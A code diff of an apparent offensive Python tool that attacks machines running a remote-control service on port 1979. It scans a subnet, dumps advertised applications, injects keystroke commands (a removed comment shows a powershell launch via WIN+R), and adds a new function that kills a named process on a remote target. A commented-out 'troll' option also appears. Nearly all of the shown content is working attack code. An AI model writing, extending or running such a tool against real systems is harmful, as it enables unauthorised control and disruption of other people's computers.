@@ -292,7 +292,7 @@ def get_appdata(target_ip: str) -> dict:
             app['icon'] = base64.b64encode(app['icon']).decode('ascii')
             apps.append(app)
 
-            _success("Received the {} application from {}".format(app['name'], target_ip))
+            _success("Received the \"{}\" application from {}".format(base64.b64decode(app['path']).decode(), target_ip))
     except socket.timeout:
         pass
     finally:
@@ -321,6 +321,20 @@ def dump_appdata(appdata: dict, target_ip: str) -> None:
     _success("Dumped applications from {}".format(target_ip))
 
 
+def close_process(target_ip: str, proc_name: str) -> None:
+    """
+    Kill the process via the name
+
+    :param target_ip: Target
+    :type target_ip: str
+    :param proc_name: Process name to kill
+    :type proc_name: str
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, 1979))
+    s.send('clo{:03d}{}'.format(len(proc_name), proc_name).encode())
+    _success("Killed {} on {}".format(proc_name, target_ip))
+    
 
 def main():
     parser = argparse.ArgumentParser()
@@ -329,8 +343,9 @@ def main():
     # parser.add_argument('--troll', type=str, action='store', choices=('delete',), help="Adds what trolling features you want to implement")
     parser.add_argument('--targets', type=str, action='store', default='-', help="Comma delimited list of targets, '-' if you want to target all IP addresses on the subnet")
     parser.add_argument('--hashes', type=str, action='store', default='', help="Comma delimited list of hashes that line up with the targets")
+    parser.add_argument('--close-process', type=str, action='store', help="Process name to kill on target(s)")
     parser.add_argument('--skip-encrypted', action='store_true', default=True, help="Skip the encrypted targets")
-    parser.add_argument('--dump-apps', action='store_true', default=True, help="Dumps apps advertised by the server")
+    parser.add_argument('--dump-apps', action='store_true', help="Dumps apps advertised by the server")
     args = parser.parse_args()
 
     if args.os == 'MacOS':
@@ -346,13 +361,16 @@ def main():
         raise ValueError("Number of hashes does not equal number of targets")
 
     if args.cmd:
-        cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
+        cmd_pkts = parse_cmd(args.cmd)
     for target in args.targets:
         
         if args.dump_apps:
             _info("Dumping application data from {}".format(target))
             appdata = get_appdata(target)
             dump_appdata(appdata, target)
+        
+        if args.close_process:
+            close_process(target, args.close_process)
         
         encrypted = target_encrypted(target)
         if args.skip_encrypted and encrypted:
